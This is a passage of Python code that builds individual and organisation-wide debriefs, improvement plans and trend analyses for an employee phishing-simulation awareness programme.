            ],
            "tone": "Educational, supportive, not punitive",
            "documentation": "Record debrief completion (not details)",
            "follow_up": "Additional training if needed",
        }
        return debrief

    def organization_wide_debrief(self, campaign_results):
        """Organization-wide debrief after campaign"""
        debrief = {
            "executive_summary": {
                "overall_susceptibility_rate": campaign_results["overall_rate"],
                "improvement_from_last_time": campaign_results["trend"],
                "top_risk_areas": campaign_results["risk_areas"],
            },
            "awareness_content": [
                "How phishing attacks work",
                "Real-world examples from the campaign",
                "Specific indicators to watch for",
                "Reporting procedures",
                "Success stories (employees who reported)",
            ],
            "improvement_plan": [
                "Targeted training for high-risk departments",
                "Policy updates based on findings",
                "Technical controls to complement awareness",
                "Regular simulation schedule",
            ],
        }
        return debrief

    def continuous_improvement(self, historical_data):
        """Plan continuous improvement based on historical data"""
        improvement = {
            "trend_analysis": self._analyze_trends(historical_data),
            "training_updates": self._update_training_content(historical_data),
            "campaign_evolution": self._evolve_campaigns(historical_data),
            "technical_controls": self._recommend_controls(historical_data),
        }
        return improvement

    def _analyze_trends(self, data):
        """Analyze trends across multiple campaigns"""
        trends = {
            "susceptibility_trend": "Decreasing/Increasing/Stable",
            "reporting_trend": "Improving/Declining/Stable",
            "repeat_offender_rate": "Percentage of employees who fail multiple campaigns",
            "department_comparison": "Which departments need more training",
        }
        return trends
```
